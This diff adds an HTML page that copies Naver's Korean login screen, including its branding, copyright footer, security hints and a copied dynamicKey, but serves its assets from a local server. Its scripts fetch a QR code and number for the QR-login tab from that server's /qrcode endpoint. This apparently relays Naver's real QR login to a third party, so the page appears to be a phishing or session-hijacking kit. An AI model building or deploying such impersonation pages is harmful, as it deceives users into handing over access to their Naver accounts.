@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="ko">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="[네이버: 로그인]">
+    <meta property="og:description" content="안전한 로그인을 위해 주소창의 URL과 자물쇠 마크를 확인하세요!">
+    <meta property="og:image" content="https://ssl.pstatic.net/sstatic/search/common/og_v3.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="1200">
+    <title>네이버 : 로그인</title>
+    <link rel="stylesheet" type="text/css" href="/static/css/w_202105.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/nidlogin.css">
+    <script src="https://code.jquery.com/jquery-latest.js"></script>
+    <script src="/static/js/nidlogin.js"></script>
+    <script src="/static/js/timer.js"></script>
+</head>
+
+<body>
+    <div id="wrap" class="wrap">
+        <div class="u_skip">
+            <a href="https://www.naver.com/">본문 바로가기</a>
+        </div>
+        <header class="header" role="banner">
+            <div class="header_inner">
+                <a href="https://www.naver.com/" class="logo">
+                    <h1 class="blind">NAVER</h1>
+                </a>
+                <div class="lang" id="show_locale_switch">
+                    <select id="locale_switch" name="locale_switch" title="언어선택" class="sel">
+                        <option value="ko_KR">한국어</option>
+                        <option value="en_US">English</option>
+                        <option value="zh-Hans_CN">中文(简体)</option>
+                        <option value="zh-Hant_TW">中文(台灣)</option>
+                    </select>
+                </div>
+            </div>
+        </header>
+
+        <div id="container" class="container">
+            <!-- content -->
+            <div class="content">
+                <div class="login_wrap">
+                    <ul class="menu_wrap" role="tablist">
+                        <li class="menu_item" role="presentation">
+                            <a id="loinid" class="menu_id on" role="tab" aria-selected="true" onclick="Change_Menu(0)">
+                                <span class="menu_text"><span class="text">ID 로그인</span></span>
+                            </a>
+                        </li>
+                        <li class="menu_item" role="presentation">
+                            <a id="ones" class="menu_ones" role="tab" aria-selected="false" onclick="Change_Menu(1)">
+                                <span class="menu_text"><span class="text">일회용 번호</span></span>
+                            </a>
+                        </li>
+                        <li class="menu_item" role="presentation">
+                            <a id="qrcode" class="menu_qr" role="tab" aria-selected="false" onclick="Change_Menu(2)">
+                                <span class="menu_text"><span class="text">QR코드</span></span>
+                            </a>
+                            <!--넛지배너-->
+                            <div class="nudge_banner" id="nudge_tooltip">
+                                <span class="nudge_text">PC방 등 공용PC라면 QR코드 로그인이 더 안전해요.</span>
+                                <button type="button" id="nudge_close" class="nudge_close">
+                                    <span class="icon_nudge_close" onclick="Close_Nudge_Banner()"></span>
+                                </button>
+                            </div>
+                        </li>
+                    </ul>
+                    <form id="frmNIDLogin" name="frmNIDLogin" target="_top" autocomplete="off"
+                        action="https://nid.naver.com/nidlogin.login" method="POST">
+                        <input type="hidden" id="localechange" name="localechange" value="">
+                        <input type="hidden" name="dynamicKey" id="dynamicKey"
+                            value="WidWl2vDrs0WT6ymF32hK9YoC36hsnAQxGiB3__Uh2stnpC3xIi6uUtm_rhFkFEu7CcG19xTUBYn-GnofS03G4AgOV5PrCuSh-XDkJFWdKQ">
+                        <input type="hidden" name="encpw" id="encpw" value="">
+                        <input type="hidden" name="enctp" id="enctp" value="1">
+                        <input type="hidden" name="svctype" id="svctype" value="1">
+                        <input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="1">
+                        <input type="hidden" name="bvsd" id="bvsd" value="">
+                        <input type="hidden" name="encnm" id="encnm" value="">
+                        <input type="hidden" name="locale" id="locale" value="ko_KR">
+                        <input type="hidden" name="url" id="url" value="https://www.naver.com">
+
+
+                        <ul class="panel_wrap">
+                            <li class="panel_item" style="display: block;">
+                                <div class="panel_inner" role="tabpanel" aria-controls="loinid">
+                                    <div class="id_pw_wrap">
+                                        <div class="input_row" id="id_line">
+                                            <div class="icon_cell" id="id_cell">
+                                                <span class="icon_id">
+                                                    <span class="blind">아이디</span>
+                                                </span>
+                                            </div>
+                                            <input type="text" id="id" name="id" placeholder="아이디" title="아이디"
+                                                class="input_text" maxlength="41" value="">
+                                            <span role="button" class="btn_delete" id="id_clear" style="display: none;">
+                                                <span class="icon_delete">
+                                                    <span class="blind">삭제</span>
+                                                </span>
+                                            </span>
+                                        </div>
+                                        <div class="input_row" id="pw_line">
+                                            <div class="icon_cell" id="pw_cell">
+                                                <span class="icon_pw">
+                                                    <span class="blind">비밀번호</span>
+                                                </span>
+                                            </div>
+                                            <input type="password" id="pw" name="pw" placeholder="비밀번호" title="비밀번호"
+                                                class="input_text" maxlength="16">
+                                            <span role="button" class="btn_delete" id="pw_clear" style="display: none;">
+                                                <span class="icon_delete">
+                                                    <span class="blind">삭제</span>
+                                                </span>
+                                            </span>
+                                        </div>
+                                    </div>
+                                    <div class="login_keep_wrap" id="login_keep_wrap">
+                                        <div class="keep_check">
+                                            <input type="checkbox" id="keep" name="nvlong" class="input_keep"
+                                                value="off">
+                                            <label for="keep" class="keep_text">로그인 상태 유지</label>
+                                        </div>
+                                        <div class="ip_check">
+                                            <a href="https://nid.naver.com/login/ext/help_ip3.html" target="_blank"
+                                                id="ipguide" title="IP보안"><span class="ip_text">IP보안</span></a>
+                                            <span class="switch">
+                                                <input type="checkbox" id="switch" class="switch_checkbox" value="off">
+                                                <label for="switch" class="switch_btn">
+                                                    <span class="blind" id="switch_blind">on</span>
+                                                </label>
+                                            </span>
+                                        </div>
+                                    </div>
+
+                                    <div class="login_error_wrap" id="err_capslock" style="display: none;">
+                                        <div class="error_message">
+                                            <strong>CapsLock</strong>이 켜져 있습니다.
+                                        </div>
+                                    </div>
+
+                                    <div class="login_error_wrap" id="err_empty_id" style="display: none;">
+                                        <div class="error_message">
+                                            <strong>아이디</strong>를 입력해 주세요.
+                                        </div>
+                                    </div>
+
+                                    <div class="login_error_wrap" id="err_empty_pw" style="display: none;">
+                                        <div class="error_message">
+                                            <strong>비밀번호</strong>를 입력해 주세요.
+                                        </div>
+                                    </div>
+                                    <div class="login_error_wrap" id="err_common" style="display:none;">
+                                        <div class="error_message" style="width:90%">
+
+                                        </div>
+                                    </div>
+                                    <div class="btn_login_wrap">
+
+                                        <button type="submit" class="btn_login" id="log.login">
+                                            <span class="btn_text">로그인</span>
+                                        </button>
+
+                                    </div>
+                                </div>
+                            </li>
+                        </ul>
+                    </form>
+                </div>
+                <ul class="find_wrap" id="find_wrap">
+
+                    <li><a target="_blank" href="https://nid.naver.com/user2/api/route?m=routePwInquiry&amp;lang=ko_KR"
+                            class="find_text">비밀번호 찾기</a></li>
+                    <li><a target="_blank" href="https://nid.naver.com/user2/api/route?m=routeIdInquiry&amp;lang=ko_KR"
+                            class="find_text">아이디 찾기</a></li>
+                    <li><a target="_blank" href="https://nid.naver.com/user2/V2Join?m=agree&amp;lang=ko_KR"
+                            class="find_text">회원가입</a>
+                    </li>
+
+                </ul>
+                <!--배너-->
+                <div class="banner_wrap">
+                    <a href="https://m.site.naver.com/0PNGp" target="_blank" id="log.banner" class="banner_inner"
+                        style="background-color: #fff; border:1px solid #dadada;">
+                        <img src="/static/img/m_banner_qrcheckin_920.jpg" width="100%" height="100%"
+                            alt="빠름주의, 네이버앱 흔들어 QR체크인" class="banner_img">
+                    </a>
+                </div>
+            </div>
+            <!-- //content -->
+        </div>
+
+        <!-- footer -->
+        <div class="footer">
+            <div class="footer_inner">
+                <!--[주]고객센터,제휴문의,서비스안내-->
+                <ul class="footer_link" id="footer_link">
+                    <li>
+                        <a target="_blank" class="footer_item" href="http://www.naver.com/rules/service.html"
+                            id="fot.agreement"><span class="text">이용약관</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a target="_blank" class="footer_item" href="http://www.naver.com/rules/privacy.html"
+                            id="fot.privacy"><span class="text">개인정보처리방침</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a target="_blank" class="footer_item" href="http://www.naver.com/rules/disclaimer.html"
+                            id="fot.disclaimer"><span class="text">책임의 한계와 법적고지</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a target="_blank" class="footer_item"
+                            href="https://help.naver.com/support/service/main.nhn?serviceNo=532" id="fot.help">
+                            <span class="text">회원정보 고객센터</span>
+                        </a>
+                    </li>
+                </ul>
+                <div class="footer_copy">
+                    <a id="fot.naver" target="_blank" href="https://www.navercorp.com/">
+                        <span class="footer_logo"><span class="blind">네이버</span></span>
+                    </a>
+                    <span class="text">Copyright</span>
+                    <span class="corp">© NAVER Corp.</span>
+                    <span class="text">All Rights Reserved.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <input type="hidden" id="nclicks_nsc" name="nclicks_nsc" value="nid.login_kr">
+    <input type="hidden" id="nid_buk" name="nid_buk" value="exist">
+    <input type="hidden" id="removeLink" name="removeLink" value="">
+    <input type="hidden" id="hide_util" name="hide_util" value="">
+    <input type="hidden" id="ncaptchaSplit" name="ncaptchaSplit" value="none">
+    <input type="hidden" id="id_error_msg" name="id_error_msg" value="&lt;strong&gt;아이디&lt;/strong&gt;를 입력해주세요.">
+    <input type="hidden" id="pw_error_msg" name="pw_error_msg" value="&lt;strong&gt;비밀번호&lt;/strong&gt;를 입력해주세요.">
+    <input type="hidden" id="locale" name="locale" value="ko_KR">
+    <input type="hidden" id="adult_surl_v2" name="adult_surl_v2" value="">
+    <input type="hidden" id="ispopup" name="ispopup" value="false">
+    <div id="nv_stat" style="display:none;">20</div>
+    <script>
+        $("#loinid").click(function() {
+            $.ajax({
+                method: "GET",
+                url: "/loinid",
+                success: function(res) {
+                    if (res["Status"] == "Failed") {
+                        alert("통신 실패");
+                    }
+                },
+                error: function(res) {
+                    alert("통신 실패");
+                }
+
+            })
+        });
+
+        $("#ones").click(function() {
+            $.ajax({
+                method: "GET",
+                url: "/ones",
+                success: function(res) {
+                    if (res["Status"] == "Failed") {
+                        alert("통신 실패");
+                    }
+                },
+                error: function(res) {
+                    alert("통신 실패");
+                }
+            })
+        });
+
+        $("#qrcode").click(function() {
+            StartTimer();
+            $.ajax({
+                method: "GET",
+                url: "/qrcode",
+                success: function(res) {
+                    if (res["Status"] == "Success") {
+                        window.qrImage.setAttribute('src', res["qrImage"]);
+                        document.getElementsByClassName('point')[0].innerText = res["number"];
+                    }
+                    else if (res["Status"] == "Failed") {
+                        alert("통신 필패");
+                    }
+                },
+                error: function(res) {
+                    alert("qr 코드를 받지 못했습니다.");
+                }
+            })
+        });
+    </script>
+</body>
+
+</html>
